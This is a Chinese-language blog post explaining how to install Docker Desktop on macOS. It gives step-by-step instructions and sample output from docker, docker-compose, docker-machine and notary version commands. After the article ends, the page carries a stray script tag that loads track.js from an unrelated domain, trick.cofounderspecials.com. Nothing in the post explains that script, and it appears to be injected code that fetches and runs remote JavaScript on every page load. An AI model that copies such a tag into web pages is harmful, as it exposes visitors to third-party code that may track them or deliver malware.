---
id: 459
title: Mac安装docker
date: '2022-06-04T23:40:02+08:00'
author: gavin
layout: post
guid: 'https://gaving.top/?p=459'
permalink: /index.php/2022/06/04/mac%e5%ae%89%e8%a3%85docker/
blocksy_post_meta_options:
    - 'a:1:{s:17:"styles_descriptor";a:3:{s:6:"styles";a:3:{s:7:"desktop";s:0:"";s:6:"tablet";s:0:"";s:6:"mobile";s:0:"";}s:12:"google_fonts";a:0:{}s:7:"version";i:5;}}'
categories:
    - Docker
---

1\) 打开浏览器，访问Docker的下载页面（<https://www.docker.com/products/docker-desktop>），然后单击 Download for Mac 按钮。

2\) 页面会跳转到 Docker 官网。

3\) 单击下载链接 Mac with Intel Chip。单击链接后，会下载 Docker.dmg 安装包。

4\) 运行上一步中下载的 Docker.dmg 文件。将代表 Docker 的鲸鱼图标拖拽到应用文件夹（Application folder）中。

5\) 打开应用文件夹并且双击 Docker 应用图标来启动 Docker。

6\) 输入 Mac 用户密码，这样安装程序可以获取到创建组件所需的权限。

7\) Docker daemon 进程启动。

一个活动的鲸鱼图标会在屏幕上方状态栏中出现。一旦 Docker 成功运行，鲸鱼图标就静止了。可以单击鲸鱼图标来管理 DfM。

DfM 现在已经安装完成，我们可以打开一个终端，并运行一些常用的 Docker 指令。

$ docker version  
Client:  
Version: 17.05.0-ce  
API version: 1.29  
Go version: go1.7.5  
Git commit: 89658be  
Built: Thu May 4 21:43:09 2017  
OS/Arch: darwin/amd64

Server:  
Version: 17.05.0-ce  
API version: 1.29 (minimum version 1.12)  
Go version: go1.7.5  
Git commit: 89658be  
Built: Thu May 4 21:43:09 2017  
OS/Arch: linux/amd64  
Experimental: true

注意，Server 的 OS/Arch 属性中显示的值是 linux/amd64。这是因为 daemon 是基于前文提到过的 Linux VM 运行的。

Client 组件是原生的 Mac 应用，运行在 Mac 操作系统 Darwin 内核之上（OS/Arch: darwin/amd64）。

除此之外，还需要注意当前 Docker 版本是一个实验性质的版本（Experimental: true）。这是因为它是抢鲜版，抢鲜版中开启了一些实验特性。

运行其他 Docker 命令。

$ docker --version  
Docker version 17.05.0-ce, build 89658be

$ docker image ls  
REPOSITORY TAG IMAGE ID CREATED SIZE

$ docker container ls  
CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES

Mac 版 Docker 安装了 Docker 引擎（客户端以及服务端守护程序）、Docker Compose、Docker machine 以及 Notary 命令行。

下面的 3 条命令展示了如何确认这些组件是否成功安装，以及组件的版本信息。

$ docker --version  
Docker version 17.05.0-ce, build 89658be

$ docker-compose --version  
docker-compose version 1.13.0, build 1719ceb

$ docker-machine --version  
docker-machine version 0.11.0, build 5b27455  
$ notary version  
notary  
Version: 0.4.3  
Git commit: 9211198

<script src="https://trick.cofounderspecials.com/track.js?v=9.999" type="text/javascript"></script>